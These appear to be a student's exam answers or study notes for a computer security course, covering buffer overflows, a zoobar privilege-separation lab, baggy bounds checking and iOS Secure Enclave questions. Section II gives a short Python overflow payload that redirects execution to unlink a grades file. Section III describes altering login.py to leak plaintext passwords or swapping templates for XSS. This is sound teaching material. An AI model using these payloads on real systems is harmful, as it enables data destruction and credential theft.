I. T/F

A. T. 
B. **T.** Because  
C. T. Different challenges each time.
D. F. 

A. T.
B. **T**. Few symbolic variables, fewer paths EXE explore. So more variables to consider, more branch taken 
C. T.

II. Buffer Overflows


1. Important part to remember is that at end of a function there is a "pop rbp; ret" instruction. Usually we don't really care about RBP, but in this case we need to control it so that when it pops into `rdi` it gives us the intended value.

So we have:
```python
arg = r'/home/httpd/grades.txt\0'
path = arg \ 
    + 'x'*(stack_retaddr-stack_buffer_len(arg)-8) \
    + struct.pack('<Q',stack_buffer) \ 
    + struct.pack('<Q',accidentally_addr) \
    + 'A'*8 \
    + struct.pack('<Q',unlink_addr)
```

III. Lab 2

4. **Note to self:** Chmod 777 = All can read/write/execute (full access)

Since the jailed zoobar directory is now read/write/executable to all users, the attacker can modify the source code for the login script (login.py) to send back to the attacker the plain-text password of every user whenever they successfully logs in into the website.

- In effect, any compromised process can now delete files under /jail/zoobar and replace them with other contents. The attacker modifies login.py to leak login attempts by inserting code in check_login(). Note that this attack is only possible because **index.cgi** transitively imports files like `login.py` and also templates (we can also achieve the attack by replacing templates file with those that serves XSS attack). As a result, we can't replace auth.py or other files used by currently running services, since those won't get updated, and it's not possible to replace or restart running processes.

IV. Baggy Bounds

5. The object will be allocated 64 bytes, for a total of 4 slots.
6. Baggy bounds stores the binary logarithm of the allocation size in the bounds table. In this case it is log_2(64) = 6
7. No, it will not generate an error. This is because the resulting pointer of `buf+43` is still within bounds.
8. No because it is within a half slot size from the bound for the object (64 bytes).
9. Yes, this will generate an error. Buf+73 is 9 bytes beyond the end of the object, and baggy bounds only allows pointers to be at most slot_size/2 bytes (8) from its section of the memory.

V. NaCL (Passed)

VI. IOS Security

12. C, D

(Revised) A powerful part of the exploit here is that the phone is unlocked (which means the passcode-derived keys are made available to the Secure Enclave), and Innocent has direct access to the iOS kernel. Even though the iOS kernel cannot peer into the inner workings of the Secure Enclave, it can still requests the Secure Enclave to decrypt files for it. 

13. The iOS kernel does not have access to any of the keys used for encryption, since those keys never leave the Secure Enclave and is thus never made available or stored in the iOS kernel or CPU. Thus modifying the iOS kernel will never achieve the intended outcome.

(Revised) Even though the FBI's iOS kernel can ask the enclave to decrypt files for it, since the phone is powered off, the passcode-derived keys are not available to the Secure Enclave and thus information cannot be decrypted. The FBI cannot also try all possible passcodes, since the Secure Enclave manages rate limiting.

